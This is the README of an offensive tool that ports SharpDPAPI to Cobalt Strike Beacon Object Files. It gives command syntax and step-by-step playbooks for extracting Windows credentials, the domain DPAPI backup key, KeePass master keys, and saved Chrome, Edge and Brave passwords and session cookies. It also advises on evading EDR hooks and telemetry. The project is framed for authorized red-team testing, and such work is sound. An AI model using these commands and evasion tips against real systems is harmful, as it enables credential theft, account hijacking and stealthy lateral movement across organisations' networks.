# DPAPI_BOF

**SharpDPAPI** ported to **Cobalt Strike Beacon Object Files (BOFs)** - 19 self-contained BOFs for DPAPI credential triage, all under 52KB each.

> Full port of [GhostPack/SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) - including MS-BKRP RPC masterkey decryption, Chrome/Edge/Brave credential extraction, and machine-level DPAPI triage.

---

## Table of Contents

- [Why BOFs?](#why-bofs)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [OPSEC Considerations](#opsec-considerations)
- [Command Reference](#command-reference)
  - [Masterkey Decryption](#masterkey-decryption)
  - [User Credential Triage](#user-credential-triage)
  - [Application-Specific](#application-specific)
  - [Machine-Level Triage](#machine-level-triage-requires-admin)
  - [Chrome / Browser](#chrome--browser)
  - [Utility Commands](#utility-commands)
- [Common Arguments](#common-arguments)
- [Usage Playbooks](#usage-playbooks)
- [Building from Source](#building-from-source)
- [Project Structure](#project-structure)
- [Credits](#credits)

---

## Why BOFs?

| | SharpDPAPI (.NET) | DPAPI_BOF |
|---|---|---|
| **Execution** | Fork & run - spawns a sacrificial process | Inline execution - runs in beacon's own thread |
| **Size** | ~600KB managed assembly | ~50KB per BOF |
| **Detection** | .NET CLR load + Assembly.Load detections | No CLR, no managed code, no child process |
| **Dependencies** | Requires .NET on target | Zero dependencies - DFR resolves APIs at runtime |
| **OPSEC** | Moderate - triggers ETW/.NET logs | High - no fork, no injection, minimal footprint |

---

## Installation

### Option 1: Download Release (Recommended)

1. Download the latest `SharpDPAPI-BOF.zip` from [Releases](../../releases)
2. Extract to a folder on your team server (e.g., `C:\Tools\DPAPI_BOF\`)

```
SharpDPAPI-BOF/
├── dpapi.cna          ← Load this in Script Manager
├── backupkey.o
├── blob.o
├── certificates.o
├── chrome_cookies.o
├── chrome_logins.o
├── chrome_statekeys.o
├── credentials.o
├── keepass.o
├── machinecredentials.o
├── machinemasterkeys.o
├── machinetriage.o
├── machinevaults.o
├── masterkeys.o
├── ps.o
├── rdg.o
├── sccm.o
├── search.o
├── triage_bof.o
└── vaults.o
```

3. In Cobalt Strike: **Script Manager → Load → `dpapi.cna`**

> **Note:** The CNA script looks for `.o` files in a `dist/` subdirectory relative to itself. If using the release zip, either:
> - Place the `.o` files in a `dist/` folder next to `dpapi.cna`, **or**
> - Edit line 7 of `dpapi.cna` to point to your `.o` file location

### Option 2: Build from Source

See [Building from Source](#building-from-source) below.

### Verifying Installation

After loading the CNA, type `help` in a beacon console. You should see all 19 commands registered:

```
beacon> help masterkeys
Usage: masterkeys [/pvk:BASE64] [/password:PASS] [/ntlm:HASH] [/credkey:KEY]
                  [/target:PATH] [/server:DC] [/sid:SID] [/rpc] [/hashes]
```

---

## Quick Start

```bash
# 1. Get domain backup key (from any domain user beacon with DC access)
backupkey /server:dc01.corp.local

# 2. Use it to decrypt everything
triage /pvk:<BASE64_PVK>

# 3. Or just use RPC (no PVK needed - asks DC to decrypt for you)
triage /rpc
```

---

## OPSEC Considerations

### Execution Model

All BOFs run via Cobalt Strike's `beacon_inline_execute()` - this means:

- ✅ **No child process** - code runs in the beacon's own thread
- ✅ **No .NET CLR** - pure C, no managed code loaded
- ✅ **No `CreateRemoteThread`** - no injection into other processes
- ✅ **No temporary DLLs** - everything is position-independent code

### API Call Visibility

These BOFs use **Dynamic Function Resolution (DFR)** - APIs are resolved at runtime via `GetProcAddress`. This avoids static IAT entries but the actual API calls are still visible to:

- **Usermode hooks** (EDR inline hooks on `CryptUnprotectData`, `BCryptDecrypt`, etc.)
- **Kernel callbacks** (ETW, syscall telemetry)
- **RPC monitoring** (the `/rpc` flag creates a named pipe connection to the DC's `\pipe\protected_storage`)

### Stealth Recommendations

| Scenario | Recommendation |
|----------|---------------|
| **Default triage** | Use `/pvk` or `/credkey` rather than `/unprotect` - avoids calling `CryptUnprotectData` which is hooked by most EDRs |
| **RPC decryption** | `/rpc` is lower-risk than `/unprotect` but creates an RPC connection to the DC. Best used during normal auth traffic windows |
| **Machine triage** | Requires `SYSTEM` access - ensure you have a high-integrity beacon. These BOFs read LSA secrets via registry |
| **Chrome extraction** | Reading Chrome SQLite databases may trigger filesystem telemetry. Use `/target:` to point at staged copies when possible |
| **Mass triage** | Run `masterkeys` first to build your key cache, then use `/credkey:` with specific commands - avoids redundant file access |

### Fork & Run Alternative

If you prefer process isolation (at the cost of OPSEC), you can modify the CNA to use `beacon_execute_assembly` with a .NET build instead. However, the whole point of BOFs is inline execution - **use it**.

---

## Command Reference

### Masterkey Decryption

#### `masterkeys`
Enumerate and decrypt user DPAPI masterkeys.

```
masterkeys [/pvk:BASE64] [/password:PASS] [/ntlm:HASH] [/credkey:KEY]
           [/target:PATH] [/server:DC] [/sid:SID] [/rpc] [/hashes]
```

| Flag | Description |
|------|------------|
| `/pvk:BASE64` | Domain DPAPI backup key (base64-encoded PVK) |
| `/password:PASS` | User's plaintext password for masterkey derivation |
| `/ntlm:HASH` | User's NTLM hash for masterkey derivation |
| `/credkey:GUID:SHA1` | Pre-computed masterkey(s), comma-separated |
| `/target:PATH` | Specific masterkey file or directory |
| `/server:DC` | Domain controller for password-based/RPC decryption |
| `/sid:SID` | User SID (required with `/password` + `/target` for remote users) |
| `/rpc` | Use MS-BKRP RPC to decrypt (any domain user, no admin needed) |
| `/hashes` | Output masterkey hashes for offline cracking with Hashcat |

**Examples:**
```bash
# Decrypt with domain backup key
masterkeys /pvk:AQAAAA...

# Decrypt with user's password
masterkeys /password:Summer2025!

# RPC - ask DC to decrypt (best for current user context)
masterkeys /rpc

# Remote user's masterkeys with their password
masterkeys /password:P@ss /target:\\fs01\C$\Users\bob\AppData\Roaming\Microsoft\Protect /sid:S-1-5-21-...

# Dump hashes for offline cracking
masterkeys /hashes
```

---

### User Credential Triage

#### `credentials`
Decrypt Windows Credential Manager files (`.vcrd`).

```
credentials [/pvk:BASE64] [/password:PASS] [/ntlm:HASH] [/credkey:KEY]
            [/target:PATH] [/server:DC] [/rpc]
```

#### `vaults`
Decrypt Windows Vault files (Web Credentials, Windows Credentials).

```
vaults [/pvk:BASE64] [/password:PASS] [/ntlm:HASH] [/credkey:KEY]
       [/target:PATH] [/server:DC] [/rpc]
```

#### `certificates`
Extract DPAPI-protected certificate private keys (PFX).

```
certificates [/pvk:BASE64] [/password:PASS] [/ntlm:HASH] [/credkey:KEY]
             [/target:PATH] [/server:DC] [/showall] [/machine] [/rpc]
```

| Extra Flag | Description |
|-----------|------------|
| `/showall` | Show all certs, including ones without exportable private keys |
| `/machine` | Triage machine certificate store instead of user |

#### `triage`
Full user DPAPI triage - runs masterkeys + credentials + vaults + certificates in one shot.

```
triage [/pvk:BASE64] [/password:PASS] [/ntlm:HASH] [/credkey:KEY]
       [/server:DC] [/showall] [/rpc]
```

**Examples:**
```bash
# Full triage with domain backup key
triage /pvk:AQAAAA...

# Full triage using RPC
triage /rpc

# Just credentials with a known password
credentials /password:Welcome1!
```

---

### Application-Specific

#### `rdg`
Decrypt Remote Desktop Connection Manager (RDCMan) saved credentials.

```
rdg [/pvk:BASE64] [/password:PASS] [/ntlm:HASH] [/credkey:KEY]
    [/target:PATH] [/server:DC] [/unprotect] [/rpc]
```

#### `keepass`
Extract KeePass master keys from `ProtectedUserKey.bin`.

```
keepass [/pvk:BASE64] [/password:PASS] [/ntlm:HASH] [/credkey:KEY]
        [/target:PATH] [/unprotect] [/rpc]
```

#### `ps`
Decrypt PowerShell `Export-Clixml` PSCredential files and `ConvertFrom-SecureString` output.

```
ps /target:FILE [/pvk:BASE64] [/password:PASS] [/ntlm:HASH]
   [/credkey:KEY] [/unprotect] [/rpc]
```

#### `sccm`
Extract SCCM Network Access Account (NAA) and task sequence credentials. Requires admin.

```
sccm [/target:PATH]
```

**Examples:**
```bash
# RDCMan passwords
rdg /rpc

# KeePass master key
keepass /pvk:AQAAAA...

# PowerShell PSCredential
ps /target:C:\Users\admin\cred.xml /unprotect

# SCCM NAA creds (run as SYSTEM)
sccm
```

---

### Machine-Level Triage (Requires Admin)

> ⚠️ These commands must be run from a **high-integrity (admin) beacon**. They read DPAPI_SYSTEM LSA secrets from the registry.

#### `machinemasterkeys`
Decrypt SYSTEM DPAPI masterkeys using the DPAPI_SYSTEM LSA secret.

```
machinemasterkeys
```

#### `machinecredentials`
Decrypt SYSTEM-level credential files.

```
machinecredentials
```

#### `machinevaults`
Decrypt SYSTEM-level vault files.

```
machinevaults
```

#### `machinetriage`
Full SYSTEM triage - masterkeys + credentials + vaults + certificates.

```
machinetriage
```

**Example workflow:**
```bash
# Elevate first
elevate svc-exe
 
# Then run machine triage
machinetriage
```

---

### Chrome / Browser

> Supports **Chrome**, **Edge**, **Brave**, and **Slack** credential stores.

#### `chrome_statekeys`
Extract the AES encryption key from Chrome's `Local State` file. This key is DPAPI-protected and used to encrypt logins/cookies in Chrome v80+.

```
chrome_statekeys [/pvk:BASE64] [/password:PASS] [/ntlm:HASH] [/credkey:KEY]
                 [/server:DC] [/target:PATH] [/browser:X] [/unprotect] [/rpc]
```

#### `chrome_logins`
Decrypt saved passwords from Chrome's `Login Data` SQLite database.

```
chrome_logins [/pvk:BASE64] [/password:PASS] [/ntlm:HASH] [/credkey:KEY]
              [/server:DC] [/target:PATH] [/statekey:HEX] [/browser:X]
              [/unprotect] [/showall] [/rpc]
```

#### `chrome_cookies`
Decrypt cookies from Chrome's `Cookies` SQLite database.

```
chrome_cookies [/pvk:BASE64] [/password:PASS] [/ntlm:HASH] [/credkey:KEY]
               [/server:DC] [/target:PATH] [/statekey:HEX] [/browser:X]
               [/cookie:REGEX] [/url:REGEX] [/unprotect] [/showall] [/rpc]
```

| Extra Flag | Description |
|-----------|------------|
| `/statekey:HEX` | Pre-extracted AES state key (skip masterkey triage) |
| `/browser:X` | Target browser: `chrome`, `edge`, `brave`, `slack` |
| `/cookie:REGEX` | Filter cookies by name (regex) |
| `/url:REGEX` | Filter cookies by URL (regex) |
| `/showall` | Include expired cookies / empty passwords |

**Recommended workflow:**
```bash
# Step 1: Extract the AES state key
chrome_statekeys /rpc

# Step 2: Use it to decrypt logins (fast - no masterkey triage needed)
chrome_logins /statekey:AABBCCDD...

# Step 3: Grab specific cookies
chrome_cookies /statekey:AABBCCDD... /cookie:session /url:github.com

# Or do it all at once (slower - triages masterkeys each time)
chrome_logins /rpc
chrome_cookies /rpc /cookie:SSID /url:google.com
```

---

### Utility Commands

#### `backupkey`
Retrieve the domain DPAPI backup key (PVK) from a domain controller. Requires DA or equivalent.

```
backupkey [/server:DC] [/nowrap]
```

| Flag | Description |
|------|------------|
| `/server:DC` | Target DC (auto-detected if omitted) |
| `/nowrap` | Output base64 PVK on a single line (for easy copy/paste) |

#### `blob`
Describe and/or decrypt a raw DPAPI blob.

```
blob /target:BASE64_BLOB [/pvk:BASE64] [/password:PASS] [/ntlm:HASH]
     [/credkey:KEY] [/unprotect] [/rpc]
```

#### `search`
Search for files or registry values containing DPAPI blobs.

```
search [/target:PATH] [/server:DC] [/pattern:REGEX] [/pvk:BASE64]
       [/credkey:KEY] [/type:TYPE] [/maxBytes:N] [/showErrors]
```

| Flag | Description |
|------|------------|
| `/type:TYPE` | Search type: `file`, `folder`, `registry`, `base64` |
| `/maxBytes:N` | Maximum file size to scan (bytes) |
| `/showErrors` | Show access-denied and other errors during search |

---

## Common Arguments

| Argument | Description | Used By |
|----------|-------------|---------|
| `/pvk:BASE64` | Domain DPAPI backup key (base64-encoded PVK) | All user commands |
| `/password:PASS` | User's plaintext password | All user commands |
| `/ntlm:HASH` | User's NTLM hash | All user commands |
| `/credkey:GUID:SHA1` | Pre-computed masterkey(s), comma-separated | All user commands |
| `/rpc` | Use MS-BKRP RPC for masterkey decryption | All user commands |
| `/server:DC` | Target domain controller | Most commands |
| `/target:PATH` | Specific file/directory to triage | Most commands |
| `/unprotect` | Call `CryptUnprotectData` (current user context) | blob, rdg, keepass, ps, chrome |
| `/showall` | Show all results including ones without keys | certificates, triage, chrome |
| `/hashes` | Output masterkey hashes for offline cracking | masterkeys |
| `/nowrap` | Single-line base64 output | backupkey |
| `/sid:SID` | Target user's SID for remote masterkey decryption | masterkeys |
| `/statekey:HEX` | Pre-extracted Chrome AES state key | chrome_logins, chrome_cookies |
| `/browser:X` | Target browser (`chrome`/`edge`/`brave`/`slack`) | chrome commands |
| `/cookie:REGEX` | Filter cookies by name | chrome_cookies |
| `/url:REGEX` | Filter cookies by URL | chrome_cookies |

---

## Usage Playbooks

### Playbook 1: Current User - Zero Knowledge

You have a beacon as a domain user. No passwords, no keys, nothing.

```bash
# RPC is your friend - ask the DC to decrypt your masterkeys
masterkeys /rpc
# Copy the {GUID}:SHA1 pairs from output

# Now triage everything with those keys
credentials /credkey:{GUID1}:{SHA1},{GUID2}:{SHA1}
vaults /credkey:{GUID1}:{SHA1}
chrome_logins /credkey:{GUID1}:{SHA1}
```

Or just:
```bash
triage /rpc
```

### Playbook 2: Domain Admin - Mass Triage

You have DA and want to triage multiple machines.

```bash
# Step 1: Get the domain backup key
backupkey /server:dc01.corp.local /nowrap

# Step 2: Triage remote users
credentials /pvk:<PVK> /target:\\workstation1\C$\Users
credentials /pvk:<PVK> /target:\\workstation2\C$\Users

# Step 3: Chrome
chrome_statekeys /pvk:<PVK> /target:\\workstation1\C$\Users
chrome_logins /pvk:<PVK> /statekey:<KEY> /target:\\workstation1\C$\Users
```

### Playbook 3: Compromised Password

You have a user's plaintext password or NTLM hash.

```bash
# Decrypt their masterkeys
masterkeys /password:Summer2025! /server:dc01.corp.local

# Or with NTLM
masterkeys /ntlm:a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4

# Then triage with the decrypted keys
credentials /credkey:<output from above>
```

### Playbook 4: Machine Triage

You have SYSTEM on a workstation.

```bash
# Full machine DPAPI triage
machinetriage

# Plus SCCM (if applicable)
sccm
```

---

## Building from Source

### Prerequisites

```bash
# Ubuntu/Debian
sudo apt install gcc-mingw-w64-x86-64 make

# Arch
sudo pacman -S mingw-w64-gcc

# macOS (via Homebrew)
brew install mingw-w64
```

### Build

```bash
git clone https://github.com/Bhanunamikaze/DPAPI_BOF.git
cd DPAPI_BOF

# Build all 19 BOFs
make

# Output in dist/
ls -la dist/*.o
```

### Size Verification

The Makefile automatically checks that all BOFs are under 300KB (Cobalt Strike's limit):

```
=== BOF Size Report ===
  [ OK ] masterkeys.o: 50879 bytes
  [ OK ] credentials.o: 50853 bytes
  ...
```

### Clean Build

```bash
make clean && make all
```

---

## Project Structure

```
DPAPI_BOF/
├── dpapi.cna                  # Aggressor script - LOAD THIS
├── Makefile                   # Cross-compilation build system
├── README.md
│
├── include/
│   ├── beacon.h               # Cobalt Strike BOF API
│   ├── bofdefs.h              # Dynamic Function Resolution (DFR) macros
│   ├── bkrp.h                 # MS-BKRP RPC client declarations
│   ├── crypto.h               # BCrypt/CNG crypto wrappers
│   ├── dpapi_common.h         # Core DPAPI types & blob parsing
│   ├── helpers.h              # Utility functions (base64, hex, etc.)
│   ├── interop.h              # Win32 interop (DC lookup, token ops)
│   ├── lsadump.h              # LSA secret extraction
│   └── triage.h               # File system triage operations
│
├── src/
│   ├── common/                # Shared library (statically linked into every BOF)
│   │   ├── bkrp.c             # MS-BKRP RPC masterkey decryption
│   │   ├── crypto.c           # AES/3DES/SHA/HMAC via BCrypt
│   │   ├── dpapi.c            # DPAPI blob parsing & decryption
│   │   ├── helpers.c          # Base64, hex, GUID, string utilities
│   │   ├── interop.c          # DC discovery, token manipulation
│   │   ├── lsadump.c          # LSA secret / DPAPI_SYSTEM extraction
│   │   └── triage.c           # Masterkey/credential/vault file triage
│   │
│   └── bofs/                  # Individual BOF entry points (19 total)
│       ├── masterkeys.c       ├── certificates.c
│       ├── credentials.c      ├── rdg.c
│       ├── vaults.c           ├── keepass.c
│       ├── blob.c             ├── ps.c
│       ├── backupkey.c        ├── search.c
│       ├── triage_bof.c       ├── sccm.c
│       ├── machinemasterkeys.c├── chrome_logins.c
│       ├── machinecredentials.c├── chrome_cookies.c
│       ├── machinevaults.c    └── chrome_statekeys.c
│       └── machinetriage.c
│
├── dist/                      # Compiled .o files (after make)
└── .github/workflows/
    └── build.yml              # CI: build + size check + release
```

## How It Works

Each BOF is compiled as a **relocatable object file** (`.o`) with all shared library code statically linked via `ld -r`. This means:

| Property | Detail |
|----------|--------|
| **Self-contained** | Each `.o` has all code it needs - no external DLLs |
| **No CRT** | Zero C runtime dependency - all Win32 calls via DFR |
| **Inline execution** | Runs in beacon's thread via `beacon_inline_execute()` |
| **Cross-compiled** | Built on Linux/macOS with MinGW-w64 |
| **Small** | All BOFs ~50KB (limit: 300KB) |

### Dynamic Function Resolution (DFR)

Instead of linking against Windows libraries, every Win32 API call is resolved at runtime:

```c
// Instead of: CryptUnprotectData(...)
// We use:     CRYPT32$CryptUnprotectData(...)
// Which expands to: GetProcAddress(GetModuleHandle("crypt32"), "CryptUnprotectData")
```

This avoids static IAT entries that are trivial for defenders to detect.

---

## Credits

- **SharpDPAPI** by [@harmj0y](https://github.com/harmj0y) / [GhostPack](https://github.com/GhostPack)
- DPAPI internals research by Benjamin Delpy ([Mimikatz](https://github.com/gentilkiwi/mimikatz))
- MS-BKRP protocol documentation by Microsoft and community researchers

## License

This project is for **authorized security testing only**. Use responsibly and in accordance with applicable laws and engagement rules.
